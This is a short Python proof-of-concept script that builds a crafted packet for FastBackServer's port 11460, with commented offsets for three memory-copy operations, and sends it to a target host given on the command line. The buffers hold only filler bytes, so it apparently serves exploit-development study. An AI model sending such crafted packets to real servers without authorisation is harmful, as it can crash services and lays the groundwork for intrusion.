#!/usr/bin/python

import socket
import sys
from struct import pack

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of following buffer)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x14: ??
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# Checksum
buf = pack('>i', 0x00000630) # Checksum, pack an "integer" from big endian
# psAgentCommand
buf += bytearray([0x41]*0x10) # ??
buf += pack('<i', 0x0) # offset 1
buf += pack('<i', 0x100) # size 1
buf += pack('<i', 0x100) # offset 2
buf += pack('<i', 0x200) # size 2
buf += pack('<i', 0x300) # offset 3
buf += pack('<i', 0x300) # size 3
buf += bytearray([0x41]*0x8) # ??
# psCommandBuffer
buf += bytearray([0x61]*0x100) # buffer 1
buf += bytearray([0x62]*0x200) # buffer 2
buf += bytearray([0x63]*0x300) # buffer 3

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
